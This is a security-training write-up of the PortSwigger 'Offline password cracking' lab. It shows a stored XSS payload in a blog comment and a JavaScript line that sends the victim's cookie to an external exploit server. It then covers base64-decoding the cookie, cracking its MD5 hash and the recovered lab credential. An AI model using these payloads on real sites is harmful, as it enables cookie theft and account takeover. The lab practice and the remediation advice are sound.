# Offline password cracking - PortSwigger Lab 38

**Severity:** Medium
**Target:** https://0a02002303f90c0c808a02ac0186002b.web-security-academy.net

## Summary
The blog is vulnerable to XSS attacks and also the stay-logged-in cookie is constructed using base64(username:MD5(password)), 
MD5 is a broken hash algorithm, making it trivial to reverse via crackstation


## Vulnerability Details
**Type:** brute-forcing a stay-logged-in cookie
**Root Cause:** Weak cookie construction using MD5 hashing with no brute-force protection on cookie-based authentication.
**Endpoint:**  https://0a02002303f90c0c808a02ac0186002b.web-security-academy.net/post?postId=4

## Steps to Reproduce
1. First go to exploit server and storage the javascript in the body with the sources needed
2. After that go to comments section and send the XSS attack
3. Turn back to exploit server and see the logs, you will see the cookie stay-logged-in.
4. Use burp decoder to decode as base64
5. Get the md5 and decode with crackstation

## Proof of Concept

Exploit's server body

```javascript
document.location='https://exploit-0a02002303f90c0c808a02ac0186002b.exploit-server.net/exploit?c='+document.cookie
```

XSS attack in comments

```javascript
<script src="https://exploit-0a02002303f90c0c808a02ac0186002b.exploit-server.net/exploit"></script>    
```

## Result
<br>
<img width="1919" height="935" alt="image" src="https://github.com/user-attachments/assets/2cd9c64b-d916-455d-b475-f313028930c8" />

<br>
<br>

``carlos:onceuponatime``

<br>
<br>
Lab 43 was too easy for PoC
<br>
<img width="1920" height="933" alt="image" src="https://github.com/user-attachments/assets/f61ece1e-f8e7-4a75-89f4-0c388f6aad63" />


## Impact

This vulnerability could lead to unauthorized account takeover. Access to the admin panel, data exposure, and the possibility of pivoting.

## Remediation
Implement output encoding in comments and validate/sanitize input on the server side.
And also use a cryptographically a secure random token as the stay-logged-in cookie instead of a predictable hash.
